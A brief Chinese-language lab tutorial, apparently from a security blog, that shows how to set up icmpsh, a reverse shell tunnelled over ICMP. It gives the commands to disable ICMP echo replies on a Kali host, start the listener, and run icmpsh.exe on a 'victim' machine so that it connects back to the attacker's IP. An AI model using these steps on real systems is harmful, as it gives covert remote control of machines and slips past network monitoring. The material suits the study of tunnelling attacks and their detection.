# icmpsh

icmpsh是一个简单的反向ICMP shell，与其他类似的开源工具相比，其主要优势在于它不需要管理权限即可运行到目标计算机上。
网络环境拓扑：

![1.png](images/e5a75b9bf4014784840999fc2b5cc5a6.png)

首先在kali上下载[icmpsh](https://github.com/inquisb/icmpsh)并关闭自身的icmp

```
./icmpsh-m.py <source IP address> <destination IP address>

sysctl -w net.ipv4.icmp_echo_ignore_all=1
python icmpsh_m.py 192.168.137.129 192.168.137.132

```

![2.png](images/acfd43527aca4832bcd8fab2345e38a4.png)

在受害机上运行以下命令

```
icmpsh.exe -t 192.168.137.129 

```

![3.png](images/7007114670724aa7bfb094b8268303a6.png)

返回kali查看shell

![4.png](images/50a5eec7260447d8a5fa879beb08b085.png)

